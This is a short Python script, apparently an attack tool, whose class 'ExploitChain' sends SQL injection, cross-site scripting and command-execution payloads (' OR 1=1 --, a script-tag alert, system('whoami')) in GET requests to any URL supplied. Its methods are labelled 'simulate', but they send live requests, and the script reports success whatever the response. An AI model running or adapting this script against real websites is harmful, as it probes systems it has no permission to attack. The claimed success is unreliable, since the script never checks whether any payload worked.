import requests

class ExploitChain:
    def __init__(self):
        self.exploit_steps = [
            "1. SQL Injection",
            "2. XSS Injection",
            "3. Remote Code Execution"
        ]
    
    def execute_exploit_chain(self, url):
        print(f"Starting exploit chain on {url}")
        for step in self.exploit_steps:
            print(f"Executing: {step}")
            self.run_exploit_step(url, step)
        print(f"Exploit chain executed successfully on {url}")

    def run_exploit_step(self, url, step):
        # Here, we simulate running the exploit step
        print(f"Simulating: {step} on {url}")
        # Add logic to perform each step in the exploit chain
        if step == "1. SQL Injection":
            self.simulate_sql_injection(url)
        elif step == "2. XSS Injection":
            self.simulate_xss_attack(url)
        elif step == "3. Remote Code Execution":
            self.simulate_rce(url)

    def simulate_sql_injection(self, url):
        payload = "' OR 1=1 --"
        response = requests.get(f"{url}?input={payload}")
        print(f"SQL Injection performed on {url}, Status Code: {response.status_code}")

    def simulate_xss_attack(self, url):
        payload = "<script>alert('XSS')</script>"
        response = requests.get(f"{url}?search={payload}")
        print(f"XSS performed on {url}, Status Code: {response.status_code}")

    def simulate_rce(self, url):
        payload = "system('whoami')"
        response = requests.get(f"{url}?command={payload}")
        print(f"Remote Code Execution performed on {url}, Status Code: {response.status_code}")
